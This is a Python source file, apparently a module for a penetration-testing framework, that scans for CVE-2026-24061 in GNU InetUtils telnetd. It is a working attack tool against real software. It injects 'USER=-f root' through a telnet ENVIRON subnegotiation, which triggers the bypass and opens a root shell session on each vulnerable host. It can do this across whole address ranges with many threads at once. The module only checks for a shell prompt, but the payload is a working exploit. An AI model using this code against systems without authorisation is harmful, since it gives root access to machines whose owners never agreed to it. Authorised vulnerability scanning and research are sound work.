import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar
from core.telnet import T, O, TelnetHandler

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""


class TelnetdAuthBypassScanner(Auxiliary):
    NAME = "GNU InetUtils telnetd Auth Bypass Scanner (CVE-2026-24061)"
    DESCRIPTION = (
        "Detects GNU InetUtils telnetd installations vulnerable to the "
        "ENVIRON argument injection (CVE-2026-24061). Sends the USER=-f root "
        "payload and checks whether the target spawns a shell instead of "
        "prompting for login. Non-destructive - reads output but does not "
        "execute commands on the target."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-01-21"
    CHECK = True
    REFERENCES = [
        "CVE-2026-24061",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-24061",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=23, type=int, description="telnet port"),
        Option("USER_VALUE", default="-f root",
               description="value to inject as $USER"),
        Option("TIMEOUT", default=8.0, type=float, description="connection timeout"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _build_payload(self):
        value = self.options["USER_VALUE"]
        p = bytearray()
        p.extend([T.IAC, T.SB, O.ENVIRON])
        p.append(0)
        p.append(0)
        p.extend(b"USER")
        p.append(1)
        p.extend(value.encode("ascii"))
        p.extend([T.IAC, T.SE])
        return bytes(p)

    def _probe(self, host):
        port = self.options["RPORT"]
        timeout = self.options["TIMEOUT"]

        try:
            sock = socket.create_connection((host, port), timeout=timeout)
        except socket.timeout:
            return HostResult(host, "unknown", "timeout")
        except ConnectionRefusedError:
            return HostResult(host, "safe", "connection refused")
        except (socket.error, OSError) as e:
            return HostResult(host, "unknown", type(e).__name__)

        sock.settimeout(timeout)

        try:
            sock.sendall(bytes([T.IAC, T.WILL, O.ENVIRON]))
            time.sleep(0.3)
            sock.sendall(self._build_payload())
            time.sleep(1.5)

            handler = TelnetHandler(sock)
            sock.settimeout(1.5)
            data = b""
            deadline = time.time() + 3.0
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                data += handler.feed(chunk)
                if b"#" in data or b"$" in data:
                    break
        except (socket.error, OSError):
            try:
                sock.close()
            except Exception:
                pass
            return HostResult(host, "unknown", "send failed")
        finally:
            try:
                sock.close()
            except Exception:
                pass

        text = data.decode(errors="replace")

        if "#" in text or "$" in text or "uid=" in text:
            snippet = text.strip().splitlines()[-1] if text.strip() else ""
            return HostResult(host, "vulnerable", "shell prompt: " + snippet[:60])

        lowered = text.lower()
        if "login:" in lowered or "password:" in lowered:
            return HostResult(host, "safe", "login prompt (patched)")

        if not text.strip():
            return HostResult(host, "safe", "no response")

        return HostResult(host, "unknown", "inconclusive response")

    def _record_host_result(self, h):
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name="telnet", banner="",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2026-24061",
            info=h.detail,
        )

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + host + ":" + str(self.options["RPORT"])))
        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info(
            "scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"
        ))

        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.yellow(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))

        return hits
